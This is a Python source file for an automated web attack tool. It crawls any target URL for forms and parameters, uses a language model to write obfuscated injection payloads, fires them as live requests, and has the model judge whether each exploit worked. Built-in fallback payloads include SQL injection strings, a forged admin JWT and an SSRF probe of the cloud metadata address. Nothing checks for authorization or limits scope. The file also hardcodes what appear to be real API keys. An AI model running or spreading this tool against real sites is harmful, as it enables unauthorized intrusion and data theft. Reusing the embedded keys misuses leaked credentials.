import os
import json
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from openai import OpenAI

# ---------- CONFIG ----------
GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "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"
SERPER_API_KEY = os.getenv("SERPER_API_KEY") or "98de95d9f23cfe0ee068a1ff872f3d93074f2255"

_cache = {}
client = OpenAI(base_url="https://api.groq.com/openai/v1", api_key=GROQ_API_KEY)

# ---------- 1. DISCOVER INJECTION POINTS (Crawls forms + URL params) ----------
def discover_injection_points(target_url: str) -> list:
    """
    Crawls the target HTML to find forms and URL parameters.
    Returns a list of injection points.
    """
    points = []
    try:
        resp = requests.get(target_url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")

        # Find all forms
        for form in soup.find_all("form"):
            method = form.get("method", "get").upper()
            action = form.get("action", "")
            # Build absolute URL
            if action.startswith("http"):
                url = action
            else:
                url = target_url.rstrip("/") + "/" + action.lstrip("/")

            inputs = form.find_all("input")
            data = {}
            for inp in inputs:
                name = inp.get("name")
                if name:
                    data[name] = ""
            if data:  # Only if there are input fields
                points.append({
                    "method": method,
                    "url": url,
                    "data": data,
                    "param": None
                })

        # Also check for query parameters in the target URL
        parsed = urlparse(target_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for key in query_params.keys():
                points.append({
                    "method": "GET",
                    "url": target_url,
                    "data": None,
                    "param": key
                })

        # Fallback if nothing found
        if not points:
            # Try common endpoints
            common_endpoints = ["/login", "/admin", "/search", "/api"]
            for ep in common_endpoints:
                points.append({
                    "method": "POST",
                    "url": target_url.rstrip("/") + ep,
                    "data": {"username": "", "password": ""},
                    "param": None
                })
    except Exception as e:
        print(f"[Discovery Error]: {e}")
        # Ultimate fallback
        points.append({
            "method": "POST",
            "url": target_url,
            "data": {"username": "", "password": ""},
            "param": None
        })
    return points

# ---------- 2. AI GENERATES PAYLOADS ----------
def ai_generate_payloads(target_url: str, vuln_type: str, num_payloads: int = 5) -> list:
    cache_key = f"payloads_{target_url}_{vuln_type}"
    if cache_key in _cache:
        return _cache[cache_key]

    prompt = f"""
You are a world‑class penetration tester. Generate {num_payloads} realistic, high‑impact payloads for testing {vuln_type} on this target: {target_url}.

Rules:
- Return ONLY a JSON array of strings.
- Each payload must be unique and context‑aware.
- Include obfuscation techniques (encoding, comments, case variation).
- Do NOT include any explanation.

Example format: ["payload1", "payload2"]
"""
    try:
        response = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are a security expert. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7
        )
        raw = response.choices[0].message.content.strip()
        start = raw.find('[')
        end = raw.rfind(']') + 1
        if start != -1 and end != 0:
            payloads = json.loads(raw[start:end])
        else:
            payloads = [raw]
        _cache[cache_key] = payloads
        return payloads
    except Exception as e:
        print(f"[AI Payload Generation Error]: {e}")
        return get_fallback_payloads(vuln_type)

# ---------- 3. SEND PAYLOAD (REAL REQUEST) ----------
def send_payload(injection_point: dict, payload: str) -> dict:
    method = injection_point.get("method", "GET")
    url = injection_point["url"]
    data = injection_point.get("data")
    param = injection_point.get("param")

    try:
        if method == "GET" and param:
            # Inject into query parameter
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param] = payload
            new_query = urlencode(query_dict, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            resp = requests.get(new_url, timeout=10, allow_redirects=False)
        elif method == "POST" and data:
            # Inject into POST data (first field)
            post_data = data.copy()
            for key in post_data.keys():
                post_data[key] = payload
                break
            resp = requests.post(url, data=post_data, timeout=10, allow_redirects=False)
        else:
            # Generic GET fallback
            resp = requests.get(f"{url}?q={payload}", timeout=10, allow_redirects=False)
        return {
            "status_code": resp.status_code,
            "response_text": resp.text[:2000],
            "error": None
        }
    except Exception as e:
        return {
            "status_code": 0,
            "response_text": "",
            "error": str(e)
        }

# ---------- 4. AI ANALYZES REAL RESPONSE ----------
def ai_analyze_response(response_text: str, payload: str, vuln_type: str, status_code: int) -> dict:
    prompt = f"""
You are a security analyst. Determine if the payload successfully exploited a {vuln_type} vulnerability.

Payload sent: {payload}
Status code: {status_code}

Response snippet:
{response_text[:1500]}

Answer with JSON:
{{
    "success": true/false,
    "reason": "Brief explanation",
    "confidence": "high/medium/low"
}}
"""
    try:
        resp = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are a security analyst. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.0
        )
        raw = resp.choices[0].message.content.strip()
        start = raw.find('{')
        end = raw.rfind('}') + 1
        if start != -1 and end != 0:
            result = json.loads(raw[start:end])
        else:
            result = {"success": False, "reason": "AI parsing failed", "confidence": "low"}
        return result
    except Exception as e:
        return {"success": False, "reason": f"AI error: {e}", "confidence": "low"}

# ---------- 5. AI SYNTHESIZES FINAL REPORT ----------
def ai_synthesize_report(target_url: str, vuln_type: str, results: list) -> str:
    prompt = f"""
You are a senior security consultant. Based on these real test results for {target_url} ({vuln_type}), write a professional red team report.

Results:
{json.dumps(results, indent=2)}

Report must include:
1. Executive summary
2. Attack vector explanation
3. Successful payloads (with evidence)
4. Impact assessment
5. Remediation steps

Write in plain text, no markdown.
"""
    try:
        resp = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are a senior security consultant. Write professional reports."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.3
        )
        return resp.choices[0].message.content.strip()
    except Exception as e:
        return f"Report generation failed: {e}"

# ---------- 6. FALLBACK PAYLOADS ----------
def get_fallback_payloads(vuln_type: str) -> list:
    fallbacks = {
        "SQL Injection": [
            "admin' OR '1'='1' --",
            "admin' UNION SELECT 1,2,3 --",
            "admin' OR 1=1 --"
        ],
        "Broken Access Control": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ"
        ],
        "SSRF": [
            "http://169.254.169.254/latest/meta-data/"
        ]
    }
    return fallbacks.get(vuln_type, ["test"])

# ---------- 7. MAIN ORCHESTRATOR ----------
def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
    # 1. Discover injection points
    injection_points = discover_injection_points(target_url)
    if not injection_points:
        return "Error: Could not discover any injection points."

    # 2. Generate payloads
    payloads = ai_generate_payloads(target_url, vuln_type)

    # 3. Test every payload on every injection point
    all_results = []
    for point in injection_points:
        for payload in payloads:
            resp_data = send_payload(point, payload)
            if resp_data["error"]:
                analysis = {"success": False, "reason": f"Request error: {resp_data['error']}", "confidence": "low"}
            else:
                analysis = ai_analyze_response(
                    resp_data["response_text"],
                    payload,
                    vuln_type,
                    resp_data["status_code"]
                )
            all_results.append({
                "injection_point": point,
                "payload": payload,
                "status_code": resp_data.get("status_code", 0),
                "response_snippet": resp_data.get("response_text", "")[:300],
                "analysis": analysis
            })

    # 4. Generate final report
    report = ai_synthesize_report(target_url, vuln_type, all_results)

    # 5. Store exploit results for status check (accessible via main.py)
    global _last_exploit_results
    _last_exploit_results = all_results

    return report

# Expose the last results so main.py can check for success
_last_exploit_results = []
def get_last_results():
    return _last_exploit_results
